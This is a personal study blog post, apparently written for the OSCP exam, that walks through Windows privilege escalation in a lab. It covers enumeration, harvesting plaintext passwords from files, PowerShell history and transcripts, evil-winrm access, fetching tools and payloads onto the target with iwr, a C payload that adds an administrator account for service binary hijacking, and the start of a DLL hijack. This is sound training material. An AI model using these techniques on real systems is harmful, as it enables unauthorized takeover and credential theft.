---
title: Windows Privilege Escalation
date: 2024-03-12 03:53:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Windows Privilege Escalation tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Windows Privilege Escalation

We often gain footholds on Windows systems as an unprivileged user. 

## Enumerating Windows

While we may use some technical attack vectors to escalate privileges, it can often be enough to just review information that users and the system leave behind, like when they store passwords in a .txt or when Windows records the input of a password in PowerShell.

### Understanding Windows Privileges and Access Control Mechanisms

Windows security mechanisms of interest include SIDs, access tokens, Mandatory Integrity Control, and User Account Control.

An SID identifies entities/principals that can be authenticated by Windows, like users or groups. Local account and group SIDs are generated by the Local Security Authority (LSA). Domain users and groups have SIDs generated by a Domain Controller (DC). SIDs are created when a user or group is created and cannot be changed.  

SIDs are formmatted like S-R-X-Y:
- S: indicates the string is a SID
- R: revision, always set to 1 since the overall SID structure is still on its initial version
- X: determines the identifier authority that issues the SID. ex: "5" is the most common and specifies the NT Authority. "5" is used for local and domain users and groups.
- Y: represents the sub authorities of the identifier authority. SIDs always have one or more sub authority, and it consists of the domain identifier and the relative identifier (RID). The domain identifier is the domain SID for domain users, the local machine SID for local users, and "32" for built in principals. The RID determines principals like users or groups.

For example, a local user: S-1-5-21-1336799502-1441772794-948155058-1001

The RID in this case is 1001. The RID starts at 1000 for almost all principals, so this implies this is the second local user created on the system.

Well-known SIDs are those that have a RID under 1000, and they identify generic/built-in users and groups instead of specific users and groups. Examples of well-known SIDs:
- S-1-0-0                       Nobody        
- S-1-1-0	                      Everybody
- S-1-5-11                      Authenticated Users
- S-1-5-18                      Local System
- S-1-5-domainidentifier-500    Administrator

Windows determines whether or not to grant operations based on an access token that Windows generated for authenticated users. The token contains several pieces of information that outline the security contrext of a user. Security context refers to the set of rules or attributes that are in effect.

The security context of a token includes the SID of the suer, the SIDs of the users' groups, the user and group privileges, and additional token scope information.

When a user starts a thread or process, a token is assigned to the objects, called a primary token. Primary tokens specify which permission the process will have when interecting with other objects and is a copy of the access token of the user.

Threads can also have an impersonation token assigned, which is used to provide a different security context than the process that owns the thread. Therefore, the threat interacts with objects on behalf of the impersonation token instead of the primary token of the process.

Windows also implementes Mandatory Integrity Control, which uses integrity levels to control access to securable objects. The levels are like hierarchies of trust that Windows has in a running object.

When objects are created or processes are started, they get the intergrity level of the principal performing the action. Executable files with low integrity levels are the exception - the process's integrity will also be low. Principals with low integrity levels cannot write to an object higher on the hierarchy, EVEN if perms would normally allow them to.

Since Windows Vista, processes run on the following integrity levels:
- System: SYSTEM (kernel, ...)
- High: Elevated users
- Medium: Standard users
- Low: Very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data
- Untrusted: Lowest integrity level with extremely limited access rights for processes or objects that pose the most potential risk

Process Explorer can show us the integrity level of processes for our current user with "$ whoami /groups" and for files, "$ icacls".

Lastly, User Account Control (UAC) is a Windows security feature protecting the OS by running most tasks and apps with standard user privileges, EVEN if the user is launching them as Administrator. The administrative user obtains two access tokens after logging on, the first being a standard user token (filtered admin token), which is used to perform all non-privileged operations, and the second token being a regular administrative token. To leverage the admin token, a UAC consent prompt has to be confirmed. 

### Situational Awareness

Always obtain the following information before continuing with attacks:
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes

First, check users and groups.

```console
$ nc 192.168.50.220 4444

// running as dave on a client, not a server. the hostname can tell us a lot - ex: WEB01 is a web server and MSSQL01 is a MSSQL1 server.

C:\Users\dave>whoami
whoami
clientwk220\dave

// help desk often have higher permissions...

C:\Users\dave> whoami /groups
CLIENTWK220\helpdesk
BUILTIN\Remote Desktop Users

// let's look at other users. daveAdmin note - admins often have one privileged account and one non--privileged account

C:\Users\dave> powershell
PS C:\Users\dave> Get-LocalUser
BackupAdmin
dave
daveAdmin
steve

// let's look at groups. backup solutions tend to have extensive perms... however, Backup Operators are standard groups who can backup and restore all files on a computer, even ones they don't have perms for. Don't confuse this group with non-standard backup groups.
// members of Remote Desktop Users access the system with rdp, while members of Remote Managemnet Users access with WinRM.

PS C:\Users\dave> Get-LocalGroup
adminteam                  Members of this group are admins to all workstations on the second floor
BackupUsers 
helpdesk

// look at users of adminteam. adminteam is nont in the group of Administrators...

PS C:\Users\dave> Get-LocalGroupMember adminteam
User        CLIENTWK220\daveadmin Local 

PS C:\Users\dave> Get-LocalGroupMember Administrators
User        CLIENTWK220\Administrator Local          
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\backupadmin     Local  
User        CLIENTWK220\offsec        Local
```

Now, check OS architecture.

```console
// build 22000 is the version 21H2 of Windows 11. we're running a 64-bit system, meaning we can run 64-bit binaries on this system. You cannot run 64-bit binaries on 32-bit systems. 

PS C:\Users\dave> systeminfo
Host Name:                 CLIENT220
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22000 N/A Build 22000
...
System Type:               x64-based PC
...

// list all ntwk interfaces. this system's ip was not generated from DCHP, but was set manually. useful information include the DNS server, gateway, subnect mask, and MAC address.
PS C:\Users\dave> ipconfig /all
Windows IP Configuration

   Host Name . . . . . . . . . . . . : clientwk220
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-8A-80-16
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::cc7a:964e:1f98:babb%6(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.50.220(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254
   DHCPv6 IAID . . . . . . . . . . . : 234901590
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-3B-F7-25-00-50-56-8A-80-16
   DNS Servers . . . . . . . . . . . : 8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

// get routing table to see potential attack vectors to other systems
PS C:\Users\dave> route print
route print
===========================================================================
Interface List
  6...00 50 56 8a 80 16 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0   192.168.50.254   192.168.50.220    271
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     192.168.50.0    255.255.255.0         On-link    192.168.50.220    271
   192.168.50.220  255.255.255.255         On-link    192.168.50.220    271
   192.168.50.255  255.255.255.255         On-link    192.168.50.220    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link    192.168.50.220    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link    192.168.50.220    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0   192.168.50.254  Default 
===========================================================================
...

// list all active ntwk connections. this system is probably running a webserver on 80 and 443. 3306 indicates a MySQL server. we see our netcat conn on port 4444, and an RDP conn from someone else on port 3389. that means there is another user on this same system, and once we elevate privileges, we can use Mimikatz to try to get that user's creds.

PS C:\Users\dave> netstat -ano
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       6824
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       960
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       6824
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1752
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1084
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       3288
...
  TCP    192.168.50.220:139     0.0.0.0:0              LISTENING       4
  TCP    192.168.50.220:3389    192.168.119.4:33060    ESTABLISHED     1084
  TCP    192.168.50.220:4444    192.168.119.3:51082    ESTABLISHED     2044
...

// check installed applications by querying 2 registry keys, asking for bot 32bit and 64bit apps
// we see the keepass password manager, 7-zip, and XAMPP.
// after we finish our situational awareness, look these up for public exploits and try to get the master password of the password manager to try to get privileged account creds.

PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
displayname                                                       
-----------                                                       
KeePass Password Safe 2.51.1                                      
Microsoft Edge                                                    
Microsoft Edge Update                                             
Microsoft Edge WebView2 Runtime                                   
...
Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913    
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913       
Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913

PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
DisplayName                                                   
-----------                                                   
7-Zip 21.07 (x64)                                             
...
XAMPP
VMware Tools                                                  
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913  

// we MUST also check the 32 and 64 bits in C:\Program Files and the Downloads directory!

// now see which are currently running
// we can infer that the Apache and MySQL servers were both started through XAMPP.

PS C:\Users\dave> Get-Process
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                               
-------  ------    -----      -----     ------     --  -- -----------                                                
     49      12      528       1152       0.03   2044   0 access
...
    477      49    17328      23904              6068   0 httpd
    179      29     9608      19792              6824   0 httpd
...                                                 
    174      16   210620      29048              1752   0 mysqld
...                                                  
    825      40    75804      14404       5.91   6332   0 powershell
...                                                
    379      24     6864      30236              2272   1 xampp-control
...
```

Extra examples: 

Get the path of a running processes' binary:

```console
$ Get-Process NonStandardProcess | Select-Object Path
```

### Hidden in Plain View

When browsing a home dir of our user of public folders, we can find sensitive information, like passwords, that provide us  vector for privilege escalation. Definitely look in meeting notes, config files, or onboarding documents!

We know that KeePass and XAMPP are on the system, so we should search for password manager databases and config files for these apps.

```console


PS C:\Users\dave> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

// also try with -Path C:\Users -Include *.txt
// no hits?
// try XAMPP config files - found passwords.txt!

PS C:\Users\dave> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Directory: C:\xampp\mysql\bin

Mode                 LastWriteTime         Length Name                                               
----                 -------------         ------ ----                                               
-a----         6/16/2022   1:42 PM           5786 my.ini
...
Directory: C:\xampp

Mode                 LastWriteTime         Length Name                                              
----                 -------------         ------ ----                                                                 
-a----         3/13/2017   4:04 AM            824 passwords.txt
-a----         6/16/2022  10:22 AM            792 properties.ini     
-a----         5/16/2022  12:21 AM           7498 readme_de.txt 
-a----         5/16/2022  12:21 AM           7368 readme_en.txt     
-a----         6/16/2022   1:17 PM           1200 xampp-control.ini  

// turns out they are only the unmodified default passwords of XAMPP, and below we can see we don't have permission to view the contents of C:\xampp\mysql\bin\my.ini

PS C:\Users\dave> type C:\xampp\passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)
...
   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 
...

PS C:\Users\dave> type C:\xampp\mysql\bin\my.ini
type : Access to the path 'C:\xampp\mysql\bin\my.ini' is denied.
At line:1 char:1
+ type C:\xampp\mysql\bin\my.ini
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\xampp\mysql\bin\my.ini:String) [Get-Content], UnauthorizedAccessEx 
   ception
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.

// check for docs in dave' home. 

PS C:\Users\dave> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\Users\dave\Desktop
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                             
-a----         6/16/2022  11:28 AM            339 asdf.txt


PS C:\Users\dave> cat Desktop\asdf.txt
cat Desktop\asdf.txt
notes from meeting:

- Contractors won't deliver the web app on time
- Login will be done via local user credentials
- I need to install XAMPP and a password manager on my machine 
- When beta app is deployed on my local pc: 
Steve (the guy with long shirt) gives us his password for testing
password is: securityIsNotAnOption++++++

// let's use steve's password. what groups is he a member of?

PS C:\Users\dave> net user steve
User name                    steve
...
Last logon                   6/16/2022 1:03:52 PM

Logon hours allowed          All

Local Group Memberships      *helpdesk             *Remote Desktop Users 
                             *Remote Management Use*Users

// while not an Admin, we can connect as Steve with RDP      

$ xfreerdp /cert-ignore /bpp:8 /smart-sizing /compression -themes -wallpaper /auto-reconnect /drive:shared,/tmp /u:steve /p:securityIsNotAnOption++++++ /h:800 /w:1400 /v:192.168.227.221

// try accessing the mysql binary as steve, since we couldn't as dave

PS C:\Users\steve> type C:\xampp\mysql\bin\my.ini
# Example MySQL config file for small systems.
...

# The following options will be passed to all MySQL clients
# backupadmin Windows password for backup job
[client]
password       = admin123admin123!
port=3306
socket="C:/xampp/mysql/mysql.sock"

// we have access, see a manually set password, and see a comment saying this is also the Windows password for backupadmin. go after backupadmin!

S C:\Users\steve> net user backupadmin
User name                    BackupAdmin
...

Local Group Memberships      *Administrators       *BackupUsers
                             *Users
Global Group memberships     *None
The command completed successfully.

// backupadmin is not a Remote Desktop User or Remote Management User. Find another way to access their system or execute commands as them.
// we have gui access, so we can use Runas to run a program as a different user. Runas can be used with local or domain accounts so long as the uer has the ability to log on to the system.
// Runas requires GUI access. However, we could use WinRM or RDP to access the system if the user is a member of the corresponding groups. Or, if the user has the "Log on as a batch job" access right, we can schedule a tast to execute a program of our choice as the user. Or, if the user has an active session, we can use PsExec from Sysinternals.

PS C:\Users\steve> runas /user:backupadmin cmd
Enter the password for backupadmin:
Attempting to start cmd as user "CLIENTWK220\backupadmin" ...
PS C:\Users\steve> 

// new commandline window appears as backupadmin

C:\Windows\system32> whoami
clientwk220\backupadmin
```

### Information Goldmine PowerShell

There is often PowerShell logging mechanisms enabled on enterprise Windows clietns and servers, such as PowerShell Transcription and PowerShell Script Block Logging.

Transcription (over-the-shoulder-transcription) stores information in transcript files, typically in the home directories of users, central directories for all users on a machine, or in a network share collecting files from all configured machines. 

Script Blocking Logging records commands and blocks of script code of events while executing. The logging is much broader because it records the full content of code and commands as they are executed. Such an event also contains the original representation of commands or encoded code! Find the Script Blocking events in Event Viewer under A[[;ocatopms amd Services > Microsoft > Windows > PowerShell > Operational. Filter for Event ID 4101.

```console
// check powershell history of a user
PS C:\Users\dave> Get-History

// retrieve history from PSReadline

PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
Clear-History
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred

// NOTE: PowerShell Remoting by default uses WinRM for Cmdlets such as Enter-PSSession. Therefore, a user needs to be in the local group Windows Management Users to be a valid user for these Cmdlets. However, instead of WinRM, SSH can also be used for PowerShell remoting.

// next, look at the transcript to find the $cred if we can

PS C:\Users\dave> type C:\Users\Public\Transcripts\transcript01.txt
type C:\Users\Public\Transcripts\transcript01.txt
**********************
Windows PowerShell transcript start
Start time: 20220623081143
Username: CLIENTWK220\dave
RunAs User: CLIENTWK220\dave
Configuration Name: 
Machine: CLIENTWK220 (Microsoft Windows NT 10.0.22000.0)
Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Process ID: 10336
PSVersion: 5.1.22000.282
...
**********************
Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
PS C:\Users\dave> $password = ConvertTo-SecureString "C -AsPlainText -Force
PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
PS C:\Users\dave> Stop-Transcript
**********************
Windows PowerShell transcript end
End time: 20220623081221
**********************

/l let's repeat these commands in our own bind shell

PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force

PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
whoami
clientwk220\daveadmin

// while whoami works, other commands don't... we need a PowerShell remoting session via WinRM on CLIENTWK220 as user dave admin
// let's use evil-winrm

kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\daveadmin\Documents> whoami
clientwk220\daveadmin

*Evil-WinRM* PS C:\Users\daveadmin\Documents> cd C:\

*Evil-WinRM* PS C:\> dir

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          6/5/2021   5:10 AM                PerfLogs
d-r---         7/20/2022   1:14 AM                Program Files
d-r---          6/5/2021   7:37 AM                Program Files (x86)
d-----          7/4/2022   1:00 AM                tools
d-r---         6/23/2022   8:12 AM                Users
d-----         7/20/2022   8:07 AM                Windows
d-----         6/16/2022   1:17 PM                xampp
```

### Automated Enumeration

NOTE: Automated tools might be blocked by AV. Try AV evasion, use other tools like Seatbelt and Jaws, or do the enum manually.

To quicken this up, let's try winPEAS.

```console
// only if not already done, put in home dir and start web server
$ cp /usr/share/peass/winpeas/winPEASx64.exe .

$ python3 -m http.server 80

// connect to bind shell on target
$ nc 192.168.201.220 4444

C:\Users\dave> powershell

// user iwr command with our winPEAS URL

PS C:\Users\dave> iwr -uri http://222.222.222.222/winPEASx64.exe -Outfile winPEAS.exe

C:\Users\dave> .\winPEAS.exe

// the output of this instance reported a different OS version, so never trust automated tools. Don't forget to try Seatbelt and JAWS.
```

## Leveraging Windows Services

Windows services are long-running background exes or apps that are managed by the Service Control Manager and are comparable to daemons on Unix. They can be managed by the Services snap-in, PS, or sc.exe in the command line. Windows uses the LocalSystem (includes the SIDs of NT AUTHORITY\SYSTEM and BUILTIN\Administrators in its token), Network Service, and Local Service user accounts in order to run its own services. Programs or users creating services can choose any one of those accounts, a domain user, or a local user.

Windows Privilege Escalation focuses heavily on searching Windows services for attack vectors.

### Service Binary Hijacking

Every service has a binary file that is executed when the service is started or transitioned into a running state. Imagine a dev made a program and installs an app as a Windows service. While installing, the dev doesn't secure the program's perms, so the entire Users group can Read and Write. This allows a lower-privileged user to replace the program with a malicious one. The user just needs to restart the service or, if the service is configured to start automatically, reboot the machine for the malicious replacement to run. Better yet, the malicious replacement will run with the privileges of the service, like LocalSystem.

To get a list of Windows services, we can use GUI-based services.msc or CMD-based Get-Service or Get-CimInstance.

```console
// NOTE: when using network logons like WinRM or a bind shell, Get-CimInstance and Get-Service will give you "permission denied" when querying for services with a non-admin user. Use an interactive logon like RDP instead.

$ xfreerdp /v:192.168.201.220 /u:dave

// get list of Windows services

PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Apache2.4                     Running "C:\xampp\apache\bin\httpd.exe" -k runservice
mysql                         Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql

// NOTE: Anything under the \xampp\ dir is user-installed, so the dev is in charge of perms, whereas \System32\ installs, the dev does not control the permisisons. This can make it vulnerable to service binary hijacking.

// emum the perms on both
Mask 	Permissions
F 	Full access
M 	Modify access
RX 	Read and execute access
R 	Read-only access
W 	Write-only access

PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(RX)
                              NT AUTHORITY\Authenticated Users:(RX)

PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)

// Users have Full Access permissions. The missing I indicator before the permission tells us that it was set on purpose, not inherited by the parent directory.

// create a quick bimary on kali

$ nano adduser.c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  i = system ("net user daveadmin password123!");
  
  return 0;
}

$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

// now transfer to target

PS C:\Users\dave> iwr -uri http://192.168.45.165/adduser.exe -Outfile adduser.exe  

PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

// need to restart the service to execute the binary

PS C:\Users\dave> net stop mysql
System error 5 has occurred.

Access is denied.

// access denied is expected, most services are managed only by admins
// new approach - if the servie Startup Type is set to "Automatic", we could try just rebooting the machine.

PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
Name  StartMode
----  ---------
mysql Auto

// in order to reboot, we need a user who has the SeShutDownPrivilege assigned (disabled just means if it is on for the currently running process [whoami])

PS C:\Users\dave> whoami /priv
Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

// always try to avoid reboots in prod

PS C:\Users\dave> shutdown /r /t 0

// after reboot

PS C:\Users\dave> Get-LocalGroupMember administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local
User        CLIENTWK220\BackupAdmin   Local
User        CLIENTWK220\dave2         Local
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\offsec        Local

// now we could use runas to get an interactive shell or use msfvenom to create a reverse shell exe.
// restore the service by deleting your malicious binary, restoring the backed up original binary, and rebooting the system.
```

Let's also quickly cover an automated tool, PowerUp.ps1, and see if it will detect this privilage escalation vector.

```console
$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .

$ python3 -m http.server 80

// switch to victim terminal

PS C:\Users\dave> iwr -uri http://192.168.45.245/PowerUp.ps1 -Outfile PowerUp.ps1
PS C:\Users\dave> powershell -ep bypass
PS C:\Users\dave>  . .\PowerUp.ps1
PS C:\Users\dave> Get-ModifiableServiceFile

// you can use the AbuseFunction to have it create a john:Password123! user and restart the service if you have the right permissions. if you don't, you'll need to reboot the entire machine.

PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'
```

Install-ServiceBinary -Name 'mysql' throws an error that the service binary is not modifiable by the current user, even though we know we have full access perms on the binary. If we review the code of PowerUp and the output of the Get-ModifiableServiceFile commands, we learn that Get-ModifiablePath is used to return modifiable paths for the current user. But, for us, it provides an empty result which causes the error.

Let's see why AbuseFunction throws an error. First, try the service binary path with no arguments with Get-ModifiablePath, and then try to add another argument to check if the function still provides the correct output. Last, try an argument with a path inside.

```console
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles
ModifiablePath                IdentityReference Permissions
--------------                ----------------- -----------
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Users     {WriteOwner, Delete, WriteAttributes, Synchronize...}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles
ModifiablePath     IdentityReference                Permissions
--------------     -----------------                -----------
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, WriteAttributes, Synchronize, ReadControl...}
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, GenericWrite, GenericExecute, GenericRead}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles
```

The above output shows that while the service binary w/ or w/o another arg works as expected, the path as an argument creates an empty result. The mysql service specifies the argument C:\xampp\mysql\bin\my.ini for defaults-file in the service binary path, so AbuseFunction throws the error. In these situations, we should use the result of the identified vulnerable service file and conduct manual exploitation, as shown earlier in this module.

All in all, never blindly trust the output of automated tools. However, PowerUp can help identify potential privilege escalation vectors. If we can't use the tool or get insufficient results, do some manual analysis if the potential vector is not vulnerable or the AbuseFunction just can't exploit it.

### Service DLL Hijacking

Privilege escalation by replacing a service's binary is quite effective, but we often won't have the permissions to do this. 

Dynamic Link Libraries (DLLs) allow programs or the OS to function, like through code, resources, icon files, etc, for exes or objects to use. Devs use these to avoid reinventing the wheel by integrating already-existing functionality. (In Unix, these are called Shared Objects)

Similarly to the previous technique, we can overwrite a DLL that the service binary uses. However, the service might not run as expected. Regardless, we'll most likely stilll get code execution of the DLL's code and run our payload.

We could also hijack the DLL search order, which determines what to inspect first when searching for DLLs (as defined by Microsoft to address DLL hijacking). All Windows versions have safe DLL search most enabled by default. Here is the Microsoft search order:

```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

When safe DLL search is disabled, the current dir is actually searched in position #2.

A special case of our new method is missing DLLs - when a binary attempts to load a DLL that doesn't exist on the system. This is common with flawed installation processes or after updates. Programs can still work missing a DLL, just with limited functionality.

Try to place a malicious DLL named the same as the missing DLL in a path of the DLL search order so it executes when the binary is started.

```console
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Name                      State   PathName
----                      -----   --------
...
BetaService               Running C:\Users\steve\Documents\BetaServ.exe
...

PS C:\Users\steve> icacls .\Documents\BetaServ.exe
.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
                         BUILTIN\Administrators:(F)
                         CLIENTWK220\steve:(RX)
                         CLIENTWK220\offsec:(F)

// we don't have perms to replace the binary yet
```

We can use Process Monitor to display real-time information about processes, threads, file system, or registry-related activities. We need to identify all DLLs located by BetaService AND detect missing ones. With this list, we can check their perms to see if we can replace them. Or, if one is missing, we'll provide our own while adhering to the DLL search order.

We do need admin perms to start Process Monitor. However, in a pentest, we would typically copy the service binary to a local machine. On this target, for example, we can install the service locally and use Process Monitor with admin privs to list all DLL activity.

Browse to C:\tools\Procmon\, double click Procmon64.exe, enter the admin creds, and continue.

Create a filter for your target process through Filter menu > Filter ... and use the following args: Process Name as Column, is as Relation, BetaServ.exe as Value, and Include as Action. Once entered, we'll click on Add. If the list turns out empty, restart the service.

```console
PS C:\Users\steve> Restart-Service BetaService
```

If the Result column shows NAME NOT FOUND after a CreateFile Operation, this means there's a DLL we can hijack. You can confirm the consecutive function calls follow the DLL search order with:

```console
PS C:\Users\steve> $env:path
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\steve\AppData\Local\Microsoft\WindowsApps;
```

These directories match the paths used in the CreateFile calls in Process Monitor.

See where the call attempts to locate the DLL. In this example, the first call attempts to locate the DLL in the Documents folder of the user we're logged in as. This means we have the perms to write to this folder and place our malicious DLL before restarted the service.

Here is an example of a basic DLL written in C++:

```c++
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

```console
$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

Send this malicious DLL to the victim machine.


```console
PS C:\Users\steve> cd Documents

PS C:\Users\steve\Documents> iwr -uri http://192.168.45.165/myDLL.dll -Outfile myDLL.dll

